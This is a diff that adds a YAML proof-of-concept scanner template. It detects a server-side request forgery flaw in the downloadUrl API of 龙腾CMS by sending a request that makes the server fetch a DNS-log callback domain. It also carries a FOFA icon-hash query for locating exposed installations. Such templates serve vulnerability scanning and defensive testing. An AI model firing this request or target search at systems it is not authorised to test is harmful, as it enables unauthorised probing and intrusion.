@@ -1,0 +1,21 @@
+id: poc-yaml-wanglongcn-ltcms-downloadUrl-ssrf
+info:
+  name: 龙腾CMS downloadUrl 服务端请求伪造漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: 龙腾CMS
+  fofa: icon_hash="-803002403"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /api/file/downloadUrl?file=http://{{.reverseDomain}}
+  expression: 'status_code == 200 &&
+
+    reverse.Verify()
+
+    '
+transport: http
